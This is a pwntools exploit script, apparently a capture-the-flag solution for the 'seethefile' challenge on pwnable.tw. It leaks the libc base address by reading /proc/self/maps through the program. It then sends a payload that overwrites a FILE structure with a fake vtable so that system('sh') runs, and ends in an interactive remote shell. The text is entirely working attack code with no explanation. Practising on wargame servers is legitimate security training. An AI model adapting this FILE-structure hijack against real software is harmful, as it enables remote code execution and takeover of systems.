from pwn import *

local = False
elf = 'seethefile' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "chall.pwnable.tw"
    port = 10200
    r = remote(ip,port)

context.arch = 'i386'
l = ELF('./libc_32.so.6')

r.recvuntil('Your choice :')
r.sendline('1')
r.recvuntil('see :')
r.sendline("/proc/self/maps")

r.recvuntil('Your choice :')
r.sendline('2')
r.recvuntil('Your choice :')
r.sendline('3')
r.recvuntil('[heap]\n')
l.address =  int(r.recv(8),16) + 0x1000
success("libc addr : %s",hex(l.address))
r.recvuntil('Your choice :')
r.sendline('5')

r.recvuntil('name :')

name_addr = 0x804B260
fake_vtable = 0x804b300
success("system : %s",hex(l.sym.system))

raw_input('aaaa')
payload = ('sh\0\0' + p32(0) * 7 + p32(name_addr)).ljust(0x48,'\x00') + p32(name_addr + 0x10)
payload = payload.ljust(0x94,'\x00') + p32(fake_vtable) + p32(0) * 2
payload = payload + p32(0)*17 + p64(l.sym.system)

r.sendline( payload )

r.interactive()
